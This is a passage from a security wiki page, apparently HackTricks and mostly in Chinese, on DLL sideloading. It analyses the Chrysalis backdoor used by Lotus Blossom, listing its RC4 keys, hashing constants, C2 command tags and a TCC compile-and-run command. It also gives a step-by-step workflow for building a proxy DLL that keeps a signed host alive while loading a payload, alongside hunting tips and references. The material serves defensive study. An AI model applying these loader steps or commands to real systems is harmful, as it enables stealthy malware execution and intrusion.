```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好 local DLLs 的 binaries（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）会以 trusted name 运行。

- **Hunting:** 对 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 的情况告警；在 admin scripts 之外并不常见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近一次 Lotus Blossom 入侵滥用了 trusted update chain，投递了一个 NSIS-packed dropper，用于部署 DLL sideload 以及完全驻留内存的 payloads。

Tradecraft flow
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个重命名后的 Bitdefender Submission Wizard `BluetoothService.exe`、一个 malicious `log.dll` 和一个 encrypted blob `BluetoothService`，然后启动该 EXE。
- host EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 会 mmap 加载该 blob；`LogWrite` 使用自定义的基于 LCG 的 stream 解密它（常量 **0x19660D** / **0x3C6EF35F**，key material 来自之前的 hash），用 plaintext shellcode 覆盖 buffer，释放临时对象，并跳转执行。
- 为避免 IAT，loader 使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193** 对 export names 做 hash，然后应用类似 Murmur 的 avalanche（**0x85EBCA6B**），并与加盐后的 target hashes 进行比较。

Main shellcode (Chrysalis)
- 通过对 key `gQ2JR&9;` 重复执行加法/XOR/减法共五轮，解密一个类似 PE 的 main module，然后动态加载 `Kernel32.dll` → `GetProcAddress`，完成 import resolution。
- 通过逐字符 bit-rotate/XOR transform 在运行时重建 DLL name strings，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个 resolver 遍历 **PEB → InMemoryOrderModuleList**，按 4-byte blocks 解析每个 export table 并进行 Murmur-style mixing；只有在 hash 找不到时才回退到 `GetProcAddress`。

Embedded configuration & C2
- Config 位于投放的 `BluetoothService` 文件内部，偏移 **0x30808**（大小 **0x980**），使用 key `qwhvb^435h&*7` 进行 RC4 解密后，会还原出 C2 URL 和 User-Agent。
- Beacon 会构建一个用点分隔的 host profile，前置 tag `4Q`，再使用 key `vAuig34%^325hGV` 进行 RC4 加密，然后通过 HTTPS 调用 `HttpSendRequestA`。响应会被 RC4 解密，并由 tag switch 分发（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）。
- Execution mode 由 CLI args 控制：无参数 = 安装 persistence（service/Run key），指向 `-i`；`-i` 会用 `-k` 重新启动自身；`-k` 会跳过安装并运行 payload。

Alternate loader observed
- 同一次入侵还投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 中执行 `svchost.exe -nostdlib -run conf.c`，旁边放置 `libtcc.dll`。攻击者提供的 C source 内嵌 shellcode，完成编译并在内存中运行，整个过程没有向磁盘写入 PE。可按如下方式复现：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- This TCC-based compile-and-run stage imported `Wininet.dll` at runtime and pulled a second-stage shellcode from a hardcoded URL, giving a flexible loader that masquerades as a compiler run.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
